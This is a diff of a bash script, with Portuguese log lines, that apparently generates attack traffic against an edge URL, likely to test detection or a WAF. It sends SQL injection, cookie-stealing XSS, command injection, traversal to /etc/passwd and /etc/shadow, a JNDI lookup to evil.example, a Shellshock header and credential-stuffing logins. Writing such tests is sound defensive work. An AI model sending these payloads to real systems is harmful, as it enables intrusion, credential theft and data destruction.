@@ -78,50 +78,54 @@ hit() {
 log "alvo: $EDGE_URL  rounds=$ROUNDS  spoof_xff=$SPOOF_XFF"
 
 for ((r = 1; r <= ROUNDS; r++)); do
-  log "=== round $r/$ROUNDS: baseline + reconhecimento ==="
+  log "=== round $r/$ROUNDS: baseline + reconhecimento (Mesa Norte) ==="
   hit GET /
+  hit GET /login
+  hit GET /api
   hit GET /robots.txt
   hit GET /.env
   hit GET /.git/config
   hit GET /server-status
-  hit GET /actuator/health
   hit GET /admin
   hit GET /wp-login.php
-  hit GET /phpmyadmin/
-  hit GET /api/v1/users
+  hit GET /api/tickets
+  hit GET /api/users
 
   log "=== round $r/$ROUNDS: SQLi ==="
-  hit GET "/products?id=1'%20OR%20'1'='1"
-  hit GET "/products?id=1%27%20UNION%20SELECT%20password%20FROM%20users--"
-  hit GET "/search?q=1;%20DROP%20TABLE%20users--"
-  hit GET "/item?id=1)%20AND%20SLEEP(5)--"
+  hit GET "/api/tickets?id=1'%20OR%20'1'='1"
+  hit GET "/api/tickets?id=1%27%20UNION%20SELECT%20password%20FROM%20users--"
+  hit GET "/login?next=1;%20DROP%20TABLE%20users--"
+  hit GET "/api/users?id=1)%20AND%20SLEEP(5)--"
 
   log "=== round $r/$ROUNDS: XSS / RCE ==="
-  hit GET "/?q=%3Cscript%3Ealert(1)%3C/script%3E"
-  hit GET "/search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
-  hit GET "/?cmd=;cat%20/etc/passwd"
-  hit GET "/?file=../../../../etc/passwd"
+  hit GET "/login?q=%3Cscript%3Ealert(1)%3C/script%3E"
+  hit GET "/api/tickets?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+  hit GET "/login?cmd=;cat%20/etc/passwd"
+  hit GET "/api/tickets?file=../../../../etc/passwd"
   hit GET "/download?path=....//....//....//etc/shadow"
 
   log "=== round $r/$ROUNDS: LFI / path traversal ==="
   hit GET "/static/..%2f..%2f..%2fetc%2fpasswd"
   hit GET "/assets/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
-  hit GET "/?page=php://filter/convert.base64-encode/resource=index"
+  hit GET "/login?page=php://filter/convert.base64-encode/resource=index"
 
-  log "=== round $r/$ROUNDS: force brute / credential stuffing (login paths) ==="
+  log "=== round $r/$ROUNDS: force brute / credential stuffing (login) ==="
   for user in "${USERS[@]}"; do
     hit POST "/login" \
       -H 'Content-Type: application/x-www-form-urlencoded' \
       --data-urlencode "username=${user}" \
       --data-urlencode "password=Password${RANDOM}!"
+    hit POST "/api/login" \
+      -H 'Content-Type: application/json' \
+      -d "{\"username\":\"${user}\",\"password\":\"Password${RANDOM}!\"}"
   done
 
   log "=== round $r/$ROUNDS: body / header anômalo ==="
-  hit POST "/api/v1/orders" \
+  hit POST "/api/tickets" \
     -H 'Content-Type: application/json' \
     -d '{"id":"1 OR 1=1","note":"<script>alert(1)</script>"}'
-  hit GET "/api/v1/search?q=\${jndi:ldap://evil.example/a}"
-  hit GET "/" -H 'User-Agent: () { :;}; /bin/bash -c "id"'
+  hit GET "/api/tickets?q=\${jndi:ldap://evil.example/a}"
+  hit GET "/login" -H 'User-Agent: () { :;}; /bin/bash -c "id"'
 done
 
 if [ -n "$COLLECTOR_URL" ]; then
